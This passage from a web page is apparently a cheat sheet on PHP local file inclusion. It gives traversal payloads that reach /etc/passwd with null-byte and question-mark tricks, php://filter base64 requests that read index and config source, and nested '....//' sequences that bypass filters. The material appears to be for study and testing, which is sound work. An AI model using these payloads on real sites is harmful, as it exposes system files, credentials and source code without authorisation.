</head><body><b>Null Byte: Bypassing the added .php and other extra file-endings</b><br/>
It is common to add the file-extension through the php-code.<br/>
<br/>
The php is added to the filename, this will mean that we will not be able to find the files we are looking for. Since the file /etc/passwd.php does not exist. However, if we add the nullbyte to the end of our attack-string the .php will not be taken into account. So we add %00 to the end of our attack-string.<br/>
http://example.com/page=../../../../../../etc/passwd%00<br/>
The technique only works in versions below php 5.3<br/>
<br/>
Another way to deal with this problem is just to add a question mark to your attack-string. This way the stuff after gets interpreted as a parameter and therefore excluded. Here is an example:<br/>
http://example.com/page=../../../../../../etc/passwd?<br/>
<br/>
<br/>
<b>Filters: Bypassing php-execution</b><br/>
So if you have an LFI you can easily read .txt-files but not .php files. That is because they get executed by the webserver, since their file-ending says that it contains code. This can be bypassed by using a build-in php-filter.<br/>
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index<br/>
<br/>
Here you use a php-filter to convert it all into base64. So in return you get the whole page base64 encoded. Now you only need to decode it. Save the base64-text into a file and then run:<br/>
base64 -d savefile.php<br/>
<br/>
<br/>

?&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;? marks a parameter in PHP<br/>

PHP filters<br/>
?page=php://filter/convert.base64-encode/resource=index&#09;attempt to get the resources as base64<br/>
?page=php://filter/read=convert.base64-encode/resource=config&#09;same, but add a filter/read<br/>

<b>Test recursive filtering<br/>
</b>If the application is attempting to sanitize user input by removing traversal sequences, and does not apply this filter recursively, then it may be possible to bypass the filter by placing one sequence within another. For example:<br/>
....//<br/>
....\/<br/>
..../\<br/>
....\\<br/>
..././ &#09;&#09;&#09;recent example that worked because it filtered "../" to "" and the payload became .""./ or ../</body></html>
